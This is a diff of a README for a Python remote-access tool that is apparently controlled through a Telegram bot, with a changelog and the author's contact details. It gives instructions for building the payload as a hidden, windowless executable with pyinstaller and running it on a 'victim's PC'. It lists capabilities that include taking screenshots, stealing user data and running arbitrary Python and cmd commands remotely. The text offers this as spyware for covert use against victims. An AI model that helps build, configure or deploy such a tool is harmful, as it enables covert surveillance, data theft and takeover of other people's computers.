@@ -9,7 +9,7 @@ Installing and creation of payload:
 
 * Install main.py script manually or with command:
 
-`git clone https://github.com/GentlemanRC/lyvir.git`
+`git clone <link>`
 
 * Then create file
 `config.py` with the next text:
@@ -20,7 +20,12 @@ Installing and creation of payload:
 `pyinstaller --noconsole --onefile main.py`
 or execute main.py script on victim's PC
 
-v. 1.0 changes:
-* First version of script, added functions of screenshots, getting victim's user data
-Python code execution
-and cmd commands execution
+v. 1.0.1 changes:
+* Fixed bug with script stop without internet access on victim's PC
+* Added ability of having many telegram id's with access to telegram bot
+
+
+Contact:
+
+Telegram: @GentlemanRCH <br>
+E-mail: gentlemanr228@gmail.com
